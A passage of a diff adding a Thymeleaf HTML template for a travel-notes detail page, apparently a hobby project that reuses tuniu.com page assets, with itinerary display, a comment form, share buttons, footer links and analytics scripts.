@@ -1,0 +1,815 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8">
+    <title>云游旅行网_云南旅行社精品网站_云南旅游云南中青国际旅行社网站</title>
+
+    <meta name="description" content="云游旅行网(yntravel.com)为云南中青国际旅行社旗下网站，提供云南旅游报价、云南自由行、昆明周边旅游、昆明出发国内游及出境游等旅游产品，云南旅行社网站首选！旅游咨询电话：400-633-5280" />
+    <link href="http://xnxw.cncnimg.cn/css/front/base.css" rel="stylesheet" type="text/css" />
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1.css?v=0317" rel="stylesheet" type="text/css" />
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1_color1.css?v=0317" rel="stylesheet" type="text/css" />
+
+    <style>
+        body {
+            text-align: center
+        }
+        .div {
+            margin: 0 auto;
+            width: 1000px;
+        }
+        /* css注释：为了观察效果设置宽度 边框 高度等样式 */
+    </style>
+
+
+</head>
+<!--[if lt IE 8]>
+<script>var auto;</script>
+<![endif]-->
+
+<body style="background:#D5F2FA url(http://x1.cncnimg.cn/p10068/10/daf8.jpg) no-repeat center top">
+
+<div class="warpper">
+
+    <div id="site_nav">
+        <div class="site_nav_bd">
+            <div class="login" th:if="${deng1}!=null"><em>欢迎来到记忆之旅 </em>
+                <em>欢迎来到记忆之旅 </em><a href="getuser.action" ><span th:text="${deng1}" id="name"></span></a>|<a href="logout.action" rel="nofollow">退出</a>
+            </div>
+            <div class="login" th:if="${deng1}==null"><em>欢迎来到记忆之旅 </em>
+                <a href="login.html">登录</a>|<a href="register.html" rel="nofollow">免费注册</a>
+            </div>
+            <div class="quick_menu">
+                <div class="top_ewm">
+                    <a class="mobile"><img src="http://x1.cncnimg.cn/p10068/10068_code.jpg"/></a>
+                </div>
+                <em>旅行社业务经营许可证 <a href="/about" target="_blank">L-YN-CJ00009</a></em>
+                <a href="/member/guester" rel="nofollow">订单查询</a>|
+                <a href="/pay_order" rel="nofollow">快捷支付</a>|            <a href="javascript:;" onClick="addBookMark()" rel="nofollow">加入收藏</a>|
+                <a href="/sitemap">网站导航</a>
+            </div>
+        </div>
+    </div>
+    <div class="header fn-clear">
+
+        <div class="nav_layer">
+            <div class="nav_layer_con">
+                <ul>
+                    <li  class="on"><a href="/"><span>首页<i class=""></i></span></a></li>
+                    <!--<li ><a href="/hotel"><span>度假酒店<i class="hot"></i></span></a></li>
+                     <li ><a href="/qianzheng"><span>签证<i ></i></span></a></li>-->
+                    <li ><a href="/ticket"><span>门票<i ></i></span></a></li>
+                    <li ><a href="/line/zhoubianyou"><span>景点<i ></i></span></a></li>
+                    <li ><a href="/chujing"><span>旅游<i ></i></span></a></li>
+                    <li ><a href="/guonei"><span>目的地<i ></i></span></a></li>
+                    <li ><a href="/line/yunnantour"><span>攻略<i ></i></span></a></li>
+                    <li ><a href="/zt"><span>旅游专题<i ></i></span></a></li>
+                    <li ><a href="/individualCommunity"><span>个人社区<i class="hot1"></i></span></a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script src="http://xnxw.cncnimg.cn/js/jquery1.10.2.min.js"></script>
+    <script src="http://xnxw.cncnimg.cn/js/front/base.js"></script>
+    <script type="text/javascript">
+        $(function(){
+            $('.J_ercode').mouseover(function(){
+                $(this).find('.J_code_img').show();
+            });
+            $('.J_ercode').mouseout(function(){
+                $(this).find('.J_code_img').hide();
+            });
+        });
+    </script>
+
+    <script type="text/javascript" src="http://xnxw.cncnimg.cn/js/index/index2.js"></script>
+    <style>
+        .nav_layer_con ul li a {
+            float: left;
+            height: 40px;
+            padding: 0 8px;
+            font-size: 14px;
+            color: #fff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .gg1000{
+            _width:100%;
+            background-color:#777;
+            background-repeat:no-repeat;
+            background-position:center top;
+            padding:0;
+            position:relative;
+        }
+        .gg1000 a{
+            display:block;
+            margin:0 auto;
+            width:1000px;
+            background-repeat:no-repeat;
+            background-position:center top;
+            min-height:40px;
+        }
+        .gg1000 img{
+            display:block;
+            _margin-left:-9000px;
+            left:-9000px;
+            position:relative;
+        }
+        .gg1000 i{
+            position:absolute;
+            background:url(/static/images/front/home30/close.gif) no-repeat;
+            right: 0px;
+            top: 0px;
+            cursor: pointer;
+            height: 40px;
+            width: 40px;
+            z-index: 10;
+            opacity:0.6;
+            filter:alpha(opacity=60);
+        }
+        .gg1000 i:hover{
+            opacity:1;
+            filter:alpha(opacity=100);
+        }
+        .tab_cont .pro_list {
+            display: none;
+        }
+        .tab_cont .showed {
+            display: block;
+        }
+        .tab_cont .showed {
+            background: url(/static/images/front/zoomloader.gif) no-repeat center center;
+        }
+    </style><!-- 头部中end --> <!-- 横向导航菜单start -->
+    <div class="header_nav index clearfix">
+        <script>function loadBaidu() {
+            var _hmt = _hmt || [];
+            (function () {
+                var hm = document.createElement("script");
+                hm.src = "//hm.baidu.com/hm.js?51d49a7cda10d5dd86537755f081cc02";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        }//在新的头尾做出后jquery会移动到尾部，到时候这里要改的if (window.$) { $(function() { loadBaidu(); });} else { loadBaidu();}</script>
+        <div class="header_inner clearfix">
+            <!-- <div class="nav_dest"> <i class="header_icon icon_catalog"></i> <span class="dest_title">出游目的地</span> <div id="categorys"></div> </div>--> </div>
+        <link type="text/css" rel="stylesheet" href="//img1.tuniucdn.com/s/201702071836/common/index_nav_menu.css"/>
+
+        <div class="subnav_wrap_bg" id="subnav_wrap_bg"></div>
+        <input type="hidden" value="11" name="tabId"/>
+        <script type="text/javascript"> (function () {
+            var nav_tabs = document.getElementsByName("nav-tab");
+            var tabId = document.getElementsByName("tabId")[0].value;
+            if (nav_tabs.length && tabId.length) {
+                for (var i = 0; i < nav_tabs.length; i++) {
+                    if (nav_tabs[i].getAttribute("data-tab") == tabId) {
+                        var class_str = nav_tabs[i].className;
+                        class_str += " selected";
+                        nav_tabs[i].className = class_str;
+                    }
+                }
+            }
+        })();</script>
+        <script>$(document).ready(function () {
+            var catLoaded = false;
+            $(document).mousemove(function () {
+                if (!catLoaded) {
+                    var getCookie = function (objName) {
+                        var arrStr = document.cookie.split("; ");
+                        for (var i = 0; i < arrStr.length; i++) {
+                            var temp = arrStr[i].split("=");
+                            if (temp[0] == objName) return unescape(temp[1]);
+                        }
+                        return false;
+                    };
+                    catLoaded = true;
+                    var cityCode = '';
+                    cityCode = getCookie("tuniuuser_citycode");
+                    cityCode = base64decode(cityCode.toString());
+                    $.getScript("//www.tuniu.com/headermenu/" + cityCode);
+                }
+            });
+        });</script>
+        <script type="text/javascript" src="//ssl3.tuniucdn.com/j/2014101501/common/index_base_v5.js"></script>
+    </div> <!-- 横向导航菜单end --></div><!-- 头部end -->
+<script type="text/javascript">function selectTag(showContent, selfObj) {
+    var tag = document.getElementById("tags").getElementsByTagName("li");
+    var taglength = tag.length;
+    for (i = 0; i < taglength; i++) {
+        tag[i].className = "";
+    }
+    selfObj.parentNode.className = "selectTag";
+    for (i = 1; j = document.getElementById("tagContent" + i); i++) {
+        j.style.display = "none";
+    }
+    document.getElementById(showContent).style.display = "block";
+}
+function getCookie(objName) {
+    var arrStr = document.cookie.split("; ");
+    for (var i = 0; i < arrStr.length; i++) {
+        var temp = arrStr[i].split("=");
+        if (temp[0] == objName) return unescape(temp[1]);
+    }
+    return false;
+}
+var tuniuPPhoneDiv = document.getElementById("tuniu_400_num_phone");
+var tuniuPPhoneNumber = getCookie("p_phone_400");
+if (tuniuPPhoneDiv) {
+    if (tuniuPPhoneNumber) {
+        tuniuPPhoneDiv.innerHTML = tuniuPPhoneNumber;
+    } else {
+        tuniuPPhoneDiv.innerHTML = "4007-999-999";
+    }
+}
+$(function ($) {
+    var sub = $("#keyword-input-sub").val();
+    if (sub && sub != '') {
+        $("#keyword-input").val(sub);
+    }
+});</script><!-- 页面类型 -->
+
+
+
+
+    <!-- img_place E -->
+    <!-- four_ad E -->
+    <script>
+        var d=new Date();
+        var elk="P_TRAVEL_DETAIL";
+    </script>
+
+    <link rel="stylesheet" href="http://img4.tuniucdn.com/f/201708111037/ui-lib/demo/pub_mod/pub_mod.css">
+    <script type="text/javascript" src="http://img1.tuniucdn.com/j/201708111037/yj_2016/pager.js"></script>
+    <script type="text/javascript" src="//img2.tuniucdn.com/j/201708111037/yj_2016/unveil.js" ></script>
+    <link rel="stylesheet" type="text/css" href="//img3.tuniucdn.com/s/201708111037/yj_2016/detail.css" media="screen"/>
+    <link rel="stylesheet" type="text/css" href="http://img1.tuniucdn.com/s/201708111037/playing/jquery.mCustomScrollbar.css" media="screen">
+<!--遍历查询的游记-->
+<div class="tuc-user" th:each="tnu:${travelNotesAndUser}">
+    <div class="top-title"></div>
+    <div class="div">
+        <div class="detail-top">
+            <div class="detail-top-center">
+                <p class="top-tag"></p>
+                <div class="top-title"><span th:text="${tnu.n_headline}"></span></div>
+                <div class="top-ding ">
+                    <i></i><span class="top-num">0</span></div>
+                <div class="top-share">
+                    <i></i><span class="top-num">0</span>
+                    <div class="share-show-top">
+                        <div class="bdsharebuttonbox bdshare-button-style0-24" data-bd-bind="1467701595909">
+                            <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+                            <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+                            <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+                            <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+                        </div>
+                    </div>
+                </div>
+                <a href="#comment_jump">
+                    <div class="top-comment"><i></i><span class="top-num">0</span>
+                    </div>
+                </a>
+                <div class="top-collect ">
+                    <i></i><span class="top-num">收藏</span></div>
+            </div>
+        </div>
+
+        <div class="detail-main">
+
+            <div class="detail-show detail-show-notit">
+                <div class="detail-img"></div>
+                <div class="detail-title-bg">
+                    <div class="detail-title">
+                        <h1 data-length="25" class="headtext lh80" style="white-space: nowrap; word-wrap: normal;">
+                            <span th:text="${tnu.n_headline}"></span></h1>
+                        <div class="detail-ding ">
+                            <a role="button" rel="nofollow" title="顶">0</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="detail-auther">
+                <div class="auther-center">
+                    <div class="auther-img">
+                        <a href="/individualCommunity" target="_blank">
+                            <img src="" th:attr="src=${tnu.head}" width="160" height="160"/>
+                    </div>
+                    <div class="tour-detail">
+                        <div class="auther-name"><span th:text="${tnu.username}"></span></a><span
+                                class='auther-level'>Lv1</span></div>
+                        <div class="auther-publish">
+                            <span class="time">发表于:<span th:text="${#calendars.format(tnu.n_releaseDate,'yyyy-MM-dd')}"></span></span>
+                            <span class="update">更新于:<span th:text="${#calendars.format(tnu.n_updateDate,'yyyy-MM-dd')}"></span></span>
+                            <span class="liulan">浏览数:<span th:text="${tnu.n_page_view}"></span></span>
+                        </div>
+                    </div>
+
+                    <ul class="tour-relation">
+                        <li class="detail-edit "><!--<span th:text=${tnu.n_id}/>-->
+                            <a th:href="@{/TravelNotes/travelNotesUpdate(n_id=${tnu.n_id})}" id="upadte"><i class="tour-edit"></i><span>编辑</span></a>
+                        <!--<script>
+                            function notesId() {
+                                var u=("#update").val();
+                                alert(u);
+                            }
+                        </script>-->
+                        </li>
+                        <li class="detail-collect ">
+                            <a href="javascript:void(0);"><i class="tour-collect"></i><span>收藏</span></a>
+                        </li>
+                        <li class="detail-comment">
+                            <a href="#comment_jump"><i
+                                    class="tour-comment"></i><span>0</span>评论</a>
+                        </li>
+                        <li class="detail-share">
+                            <a href="javascript:void(0);"><i class="tout-share"></i><span>0</span>分享</a>
+                            <div class="share-show">
+                                <div class="bdsharebuttonbox bdshare-button-style0-24" data-bd-bind="1467701595909">
+                                    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+                                    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+                                    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+                                    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+                                </div>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="detail-content">
+                <div class="content-left">
+                    <div style="text-align:center;font-family:verdana;padding:20px;border-radius:10px;border:10px solid #000000;">
+                    <table>
+                        <thead >
+                        <th text-align="center">行程单&nbsp;:&nbsp;&nbsp;<span th:text="${tnu.n_time_limit}"></span></th>
+                        </thead>
+                        <tfoot class="sch_btn sch_down">
+                        <th text-align="center"><span th:text="${tnu.n_city}"></span>------>>><span th:text="${tnu.n_destination}"></span>
+                            ------>>><span th:text="${tnu.n_scenic}"></span></th>
+                        </tfoot>
+                    </table>
+                    </div>
+                    <p class="section-tit index1" id="tit0"><span th:text="${tnu.n_section_titles}"></span><div class="tit-line"></div></p>
+                    <p class="section-des"><span th:text="${tnu.n_essay}"></span></p>
+                    <div class="section-img" id="519808">
+                        <img src="http://img1.tuniucdn.com/site/images/yj_2016/init-img.jpg" data-src="http://m.tuniucdn.com/fb2/t1/G3/M00/80/C7/Cii_JVmNJnCIIOGNAAOAyRuCdhkAAG9WgGYkP4AA4Dh269.jpg" style="display: inline;"/>
+                        <p class="section-img-intr"></p>
+                    </div>
+                    <div class="count-content"><div class="count-line"></div></div>
+                    <!--             评论模块  START          -->
+                    <!--<div class="content-comment">-->
+                        <form action="" method="post" id="form1">
+                        <div class="comment-report" id="comment_jump">
+                            <h4>发表评论<input name="notes_id" th:value="${tnu.n_id}" hidden="hidden"/></h4>
+                            <textarea  id="r_comment" name="c_discuss" class="report-textarea" maxlength="1000" placeholder="评论一下~"></textarea>
+                            <div class="input-limit"><span id="input-words">0</span>/1000</div>
+                            <button type="submit" class="comment-submit" value="提交" onclick="comment();">提交</button>
+                        </div>
+                        </form>
+                        <script>
+                            function comment(){
+                                var formParam = $("#form1").serialize();//序列化表格内容为字符串
+                                $.ajax({
+                                    type:'post',
+                                    url:'/TravelComment/addTravelComment',
+                                    data:formParam,
+                                    cache:false,
+                                    dataType:'json',
+                                    success:function(){
+
+                                    }
+                                },"json");
+                            }
+                        </script>
+                        <div class="comment-net" style="display:none">
+                            <h4>网友评论</h4>
+                            <div class="list-show">
+                                <div class="commen-loading"></div>
+                                <ul class="list-data" id="commentary">
+                                </ul>
+                                <div id="commit-page" class="pagination"></div>
+                            </div>
+                        </div>
+                    <!--</div>-->
+                    <!--               弹窗编辑                 -->
+
+                    <!--举报-->
+
+
+                    <script id="reportBoxTemplate" type="text/html">
+                        <div id="reportBox" class="pop_box pop_report">
+                            <a href="javascript:void(0)" class="close"></a>
+                            <div class=""></div>
+                            <h3>举报</h3>
+                            <form id="frm" enctype="multipart/form-data" class="form-horizontal">
+                                <input name="tid" value="5" type="hidden">
+                                <input id="comment_rply_id" name="comment_rply_id" type="hidden" value="426998">
+                                <p class="des_box">
+                                    <label>
+                                        <input type="radio" name="question_type" value="1">广告贴和灌水帖</label>
+                                    <label>
+                                        <input type="radio" name="question_type" value="2">谩骂、诽谤和聊天帖</label>
+                                    <label>
+                                        <input type="radio" name="question_type" value="3">违反国家相关法律法规的内容</label>
+                                    <label>
+                                        <input type="radio" name="question_type" value="4">其他问题</label>
+                                </p>
+                                <p>具体描述</p>
+                                <textarea id="report_intro" name="report_intro" class="w_comment des_comment" maxlength="500"></textarea>
+
+                                <div class="comment_btn">
+                                    <input type="button" name="save" value="提交" class="comment_suc">
+                                </div>
+                            </form>
+                        </div>
+                    </script>
+
+                    <!--回复-->
+                    <!--<script id="replyBoxTemplate" type="text/html">
+                        <div id="replyBox" class="pop_box reply_box">
+                            <a href="javascript:void(0)" class="close"></a>
+                            <div class=""></div>
+                            <h3>发表回复</h3>
+                            <div class="comment_box">
+                                <textarea id="h_comment" class="w_comment comment_textarea" maxlength="1000"></textarea>
+                                <p class="replay-name"></p>
+                            </div>
+                            <input id="commentReplyId" type="hidden" value="427386">
+                            <input id="updateFlag" type="hidden" value="1">
+                            <div class="msg">
+                                你还可以输入
+                                <span id="h_limitNum" class="h_limitNum">1000</span>
+                                个字符
+                            </div>
+                            <div class="comment_btn">
+                                <input type="button" value="取消" class="comment_cancle">
+                                <input type="button" value="提交" class="comment_suc">
+                            </div>
+                        </div>
+
+                    <script>
+                        var commentPageCount = 0;
+                    </script>
+                    <script id="commit-list" type="text/html">
+                        <% for(var i=0; i<data.comments.length; i++){%>
+                        <li class="commentary-co clearfix" data-ciid="<%=data.comments[i].commentId%>">
+                            <div class="comment-box">
+                                <div class="commentary-auth">
+                                    <img width="120" src="<%=data.comments[i].headImag%>" alt="headpic">
+                                </div>
+                                <div class="comment-data">
+                                    <div class="comment-words">
+                                        <span class="author-name"><a rel="nofollow" href="http://www.tuniu.com/person/<%=data.comments[i].authorPagecode%>" target="_blank"><%=data.comments[i].authorName%>：</a></span><span class="commentary-txt" style="word-wrap: break-word;"><%=data.comments[i].commentContent%></span>
+                                    </div>
+                                </div>
+                                <div class="comment-btm">
+                                    <div class="comment-btn">
+                                        <a class="author-operation" href="javascript:void(0)">&nbsp;回复</a>&nbsp;&nbsp;
+                                        <a rel="nofollow" class="author-report" href="javascript:void(0)" data-id="<%=data.comments[i].commentId%>">举报</a>
+                                    </div>
+                                    <div class="comment-time">
+                                        <span>发表于：</span><span id="publish-time"><%=data.comments[i].commentDate%></span>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <%}%>
+                    </script>-->
+
+                    <!--             评论模块  END         -->
+                </div>
+                <div id="dialog-overlay" style="height: 67052px; width: 1018px; display: none;"></div>
+                <div class="content-right">
+                    <!--             <a class="right-ad-pic" href="#">
+                                    <img src="http://file6.mafengwo.net/M00/3F/5F/wKgBt09cVKiRdCjCAADrfTo0kKE93.mdd.w290_h195.jpeg" alt="">
+                                </a> -->
+
+                    <!-- 广告位  -->
+                    <a href="http://www.tuniu.com/trips/10104110" class="right-ad-pic" target="_blank" rel="nofollow">
+                        <img src="http://m.tuniucdn.com/fb2/t1/G2/M00/87/5A/Cii-TFfrnLaIShCmAACSoJwNT8gAAC2DQGfoR8AAJK451_w800_h0_c0_t0.jpeg" alt="游记详情页banner">
+                    </a>
+                    <div class="right-product">
+                        <div class="right-title">同款推荐</div>
+                        <a class="product-show" href="http://www.tuniu.com/tours/210081841" target="_blank">
+                            <div class="product-pic">
+                                <img src="http://m.tuniucdn.com/fb2/t1/G1/M00/5D/14/Cii9EFcEhdWIb8AsAAxXnlK9vP8AAC8tgMvyIYADFe2845_w450_h300_c1_t0.jpg" alt="">
+                                <div class="product-name">[国庆]<北京双高5日游>牛人五星绝无暗店，万人出游年度热销，高满意度精华必玩，畅游皇城首要之选，乐享纯玩之旅</div>
+                            </div>
+                            <div class="product-price">
+                                <span>￥</span>2829.0<span class="price-qi">起</span>
+                            </div>
+                            <div class="product-atisfaction">满意度<span>96%</span></div>
+                        </a>
+                    </div>
+                    <div class="recommend-person" >
+                        <div class="right-title">相关游记</div>
+                        <!--                <a class="section-img-poi" href="http://www.tuniu.com/g/guide-0-0/" target="_blank">
+                                            <i></i>
+                                                            </a>-->
+                        <ul class="person-show">
+                            <li>
+                                <a href="/trips/12549130" target="_blank">
+                                    <p>【首发】#新发现# 春夏逛北京（方家胡同46号院、地坛公园）</p>
+                                    <div class="person-img">
+                                        <img src="http://m.tuniucdn.com/fb2/t1/G1/M00/56/26/Cii9EFZpaOKIISLkAAPuCv2xK_wAAA8OwIhj8sAA-4i741_w90_h90_c1_t0.jpg" alt="">
+                                        <div class="person-name">绿日光</div>
+                                        <div class="person-time">2017-04-26</div>
+                                    </div>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/trips/12458242" target="_blank">
+                                    <p>【途牛首发】印象深秋，一个人走走停停的北京</p>
+                                    <div class="person-img">
+                                        <img src="http://m.tuniucdn.com/fb2/t1/G2/M00/75/C1/Cii-T1js2ZSIcx8UAA2A0ityZX4AAJI9gFFptMADYDq396_w90_h90_c1_t0.jpg" alt="">
+                                        <div class="person-name">行走的迈克尔</div>
+                                        <div class="person-time">2016-12-05</div>
+                                    </div>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/trips/10502763" target="_blank">
+                                    <p>选择酒店，一切只为更好的出发！芳香之境，邂逅麗枫</p>
+                                    <div class="person-img">
+                                        <img src="http://m.tuniucdn.com/filebroker/cdn/snc/da/07/da07e52118c595d5f3287ef8684c5384_w90_h90_c1_t0.jpg" alt="">
+                                        <div class="person-name">满星Min</div>
+                                        <div class="person-time">2016-10-31</div>
+                                    </div>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="fix-catalog">
+                        <div class="other-destination" >
+                            <i></i>
+                            相关目的地：
+                            <a class="destination-icon" target="_blank" href="http://www.tuniu.com/g200/guide-0-0/"></a>
+                            <a class="link_de" target="_blank" href="http://www.tuniu.com/g200/guide-0-0/">北京</a>
+                        </div>
+                        <div class="catalog-line"></div>
+                        <div class="catalog-name">游记目录</div>
+                        <div class="tour-catalog">
+                            <ul class="catalog-list" id="nav">
+
+                            </ul>
+                        </div>
+                    </div>        </div>
+            </div>
+        </div>
+        <script>
+            var tid = 12564605;
+            var taskId = 0;
+        </script>
+        <script>
+            window._bd_share_config = {
+                "common": {
+                    "bdUrl": location.href,
+                    "bdSnsKey": {
+                        "tsina": "http:www.tuniu.com",
+                        "tqq": "http:www.tuniu.com",
+                        "t163": "http:www.tuniu.com",
+                        "tsohu": "http:www.tuniu.com"
+                    },
+                    "bdText": $('.top-title').html(),
+                    "bdMini": "1",
+                    "bdMiniList": ["qzone", "tsina", "weixin", "tqq", "duitang", "hx", "fx", "youdao", "sdo", "qingbiji", "people", "xinhua", "mail", "isohu", "yaolan", "wealink", "ty", "iguba", "fbook", "twi", "linkedin", "h163", "evernotecn", "copy", "print"],
+                    "bdPic": "",
+                    "bdStyle": "0",
+                    "bdSize": "24"
+                },
+                "share": {}
+            };
+        </script>
+
+        <script src="http://img4.tuniucdn.com/mj/201708111037/global/fps.min.js"></script>
+        <script type="text/javascript" src="http://img1.tuniucdn.com/j/201708111037/yj_2016/template.js"></script>
+        <script src="http://img1.tuniucdn.com/j/201708111037/tn_photo/lib/layer.min.js"></script>
+        <script type="text/javascript" src="//img3.tuniucdn.com/j/201708111037/yj_2016/detail.js"></script>
+        <script type="text/javascript" src="http://img1.tuniucdn.com/j/201708111037/playing/jquery.mCustomScrollbar.concat.min.js"></script>
+    </div>
+    <!--遍历查询的游记-->
+<link rel="stylesheet" type="text/css" href="//ssl1.tuniucdn.com/s/20151019/common_foot/common_foot_v3.css" /> <div class="trav_sev">
+
+    <div class="three_trav">
+        <div class="thr_trav">
+            <a href="http://www.tuniu.com/static/sunshine_ensure/" target="_blank"
+               style="display:block;width:100%;height:100%;">
+                <em class="tn_text" id="service_phone_head_text">客户服务电话</em>
+                <em class="tn_phone" id="service_phone_head_phone">4007-999-999</em>
+            </a>
+        </div>
+    </div>
+    <!--start foot-->
+    <!-- three sun S -->
+    <div class="center">
+        <div class="footer">
+            <div class="help">
+                <div class="txt bd_l0"><i class="i1"></i>
+                    <strong>轻松成为旅行玩家</strong>
+                    <p><a href="/help//5547" rel="nofollow" alt="旅行要知道" title="旅行要知道">旅行要知道</a></p>
+                    <p><a href="/help//5548" rel="nofollow" alt="怎么选择一次好的旅行" title="怎么选择一次好的旅行">怎么选择一次好的旅行</a></p>
+                    <p><a href="/help//5549" rel="nofollow" alt="旅行常见问题" title="旅行常见问题">旅行常见问题</a></p>
+                    <p><a href="/help//5550" rel="nofollow" alt="旅游工具箱" title="旅游工具箱">旅游工具箱</a></p>
+                </div>
+                <div class="txt "><i class="i1"></i>
+                    <strong>怎么预订</strong>
+                    <p><a href="/help//5551" rel="nofollow" alt="旅游预订方式" title="旅游预订方式">旅游预订方式</a></p>
+                    <p><a href="/help//5553" rel="nofollow" alt="预订常见问题" title="预订常见问题">预订常见问题</a></p>
+                    <p><a href="/help//5554" rel="nofollow" alt="签署旅游合同" title="签署旅游合同">签署旅游合同</a></p>
+                    <p><a href="/help//5556" rel="nofollow" alt="预订流程与服务承诺" title="预订流程与服务承诺">预订流程与服务承诺</a></p>
+                </div>
+                <div class="txt "><i class="i1"></i>
+                    <strong>怎么付款</strong>
+                    <p><a href="/help//5559" rel="nofollow" alt="付款方式" title="付款方式">付款方式</a></p>
+                    <p><a href="/help//5560" rel="nofollow" alt="付款说明与使用帮助" title="付款说明与使用帮助">付款说明与使用帮助</a></p>
+                    <p><a href="/help//5562" rel="nofollow" alt="支付安全保障" title="支付安全保障">支付安全保障</a></p>
+                    <p><a href="/help//5563" rel="nofollow" alt="关于发票" title="关于发票">关于发票</a></p>
+                </div>
+                <div class="txt bd_r0"><i class="i1"></i>
+                    <strong>开始旅行</strong>
+                    <p><a href="/help//5564" rel="nofollow" alt="出发前的准备" title="出发前的准备">出发前的准备</a></p>
+                    <p><a href="/help//5566" rel="nofollow" alt="服务建议与投诉" title="服务建议与投诉">服务建议与投诉</a></p>
+                    <p><a href="/help//5567" rel="nofollow" alt="旅行故事分享" title="旅行故事分享">旅行故事分享</a></p>
+                    <p><a href="/help//5568" rel="nofollow" alt="其它服务事项" title="其它服务事项">其它服务事项</a></p>
+                </div>
+                <!-- <div class="J_imgbox"><img src=""></div> -->
+            </div>
+
+            <div class="bottom_ico fn-clear" style="text-align: center;">
+                <ul>
+
+                    <li class="xukezheng" style="float: none;"><a href="/about"><i style="-webkit-transform:scale(0.8); font-family: Arial;">L-YN-CJ00009</i></a></li>                <li style="float: none;"><span class="pay"></span></li>
+                </ul>
+            </div>
+            <div class="copyright fn-clear">
+                <div class="nav">
+                    <a href="#">关于记忆之旅</a>
+                    <a href="#">联系记忆之旅</a>
+                    <a href="/sitemap">网站地图</a><a href="/link">友情链接</a>
+                    <a href="/help">帮助中心</a>
+                    <a href="/cp/login" rel="nofollow">管理</a>
+                </div>
+                <p><span>Copyright &copy; 2017 <a href="/" target="_blank">记忆之旅</a>   <a href="http://www.miitbeian.gov.cn/" target="_blank" rel="nofollow">滇ICP备14006366号-1</a></span>
+                    志广科技有限公司旗下网站  公司地址：北京海淀区1314区520室  直线电话：010-666666
+                </p>
+
+
+                <p><a href="http://is.cncn.net/" target="_blank">欣欣建站</a>&nbsp;&nbsp;&nbsp;&nbsp;技术支持：<a href="http://www.cncn.net/" target="_blank">欣欣同业</a> & <a target="_blank" href="http://www.cncn.com/">欣欣旅游</a></p>
+            </div>
+
+            <div class="link mt10">
+                <strong>友情链接：</strong>
+                <a href="http://www.52uyn.com/" target="_blank" title="云南旅游">云南旅游</a>
+                <a href="http://www.dujiazoo.com/" target="_blank" title="云度旅行">云度旅行</a>
+                <a href="http://www.tourcool.com/" target="_blank" title="成都青年旅行社">成都青年旅行社</a>
+                <a href="http://www.phuketrip.com/" target="_blank" title="普吉岛旅游">普吉岛旅游</a>
+                <a href="http://www.sanxia-china.com/" target="_blank" title="三峡旅游">三峡旅游</a>
+                <a href="http://www.52ycd.com/" target="_blank" title="承德旅游网">承德旅游网</a>
+                <a href="" target="_blank" title=""></a>
+                <a href="/link">更多>></a>
+            </div>
+        </div>
+    </div>
+
+    <!--end foot-->
+
+    <script language="javascript" src="//ssl4.tuniucdn.com/j/201704191800/common/mobile_app.js,common/zeus.js"></script>
+    <script type="text/javascript">
+        var tuniuRecorder = _zeus.getRecorder();
+    </script>
+
+    <script src="//ssl4.tuniucdn.com/j/201714191800/rightcommon/underscore.js,rightcommon/main_prd_v3.js,rightcommon/getdata_v4.js"></script>
+    <script type="text/javascript" src="//ssl3.tuniucdn.com/j/201505212000/common/jquery_autoSlide.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $("#slideOrder").autoSlide();
+        })
+    </script>
+    <!--end foot-->
+    <script type="text/javascript">
+        var catLoaded = false;
+        $(document).mouseover(function () {
+            if (!catLoaded) {
+                catLoaded = true;
+                $(".categorys").load('/header/null');
+            }
+        });
+    </script>
+    <style>
+        .index_app {
+            left: 50%;
+            top: 50%;
+            margin-left: 510px;
+            margin-top: -100px;
+            position: fixed;
+            _position: absolute;
+            z-index: 10000;
+            border: 1px solid #d8d8d8;
+            padding: 0 0 5px 0;
+            background: #fff;
+        }
+
+        .index_app a,
+        .index_app img {
+            display: block;
+            v
+        }
+
+        .index_app .index_app_top {
+            margin-bottom: 2px;
+        }
+    </style>
+    <script type="text/javascript"
+            src="http://img4.tuniucdn.com/j/2014091710/common/lazyloadnew.min.js,indicator/indicator.js"></script>
+    <!-- GA/TA -->
+    <script>
+        window.COLLECT && window.COLLECT("", "", "", "");
+    </script>
+
+    <script type="text/javascript">
+        var _gaq = _gaq || [];
+        _gaq.push(['_setAccount', 'UA-4782081-5']);
+        _gaq.push(['_setDomainName', 'tuniu.com']);
+        _gaq.push(["_setAllowHash", false]);
+        _gaq.push(["_setAllowAnchor", true]);
+        _gaq.push(["_addOrganic", "baidu", "wd"]);
+        _gaq.push(["_addOrganic", "baidu", "word"]);
+        _gaq.push(["_addOrganic", "google", "q"]);
+        _gaq.push(["_addOrganic", "118114", "kw"]);
+        _gaq.push(["_addOrganic", "bing", "q"]);
+        _gaq.push(["_addOrganic", "soso", "w"]);
+        _gaq.push(["_addOrganic", "youdao", "q"]);
+        _gaq.push(["_addOrganic", "sogou", "query"]);
+        _gaq.push(["_addOrganic", "360", "q"]);
+        _gaq.push(["_addOrganic", "baidu", "w"]);
+        _gaq.push(["_addOrganic", "baidu", "q1"]);
+        _gaq.push(["_addOrganic", "baidu", "q2"]);
+        _gaq.push(["_addOrganic", "baidu", "q3"]);
+        _gaq.push(["_addOrganic", "baidu", "q4"]);
+        _gaq.push(["_addOrganic", "baidu", "q5"]);
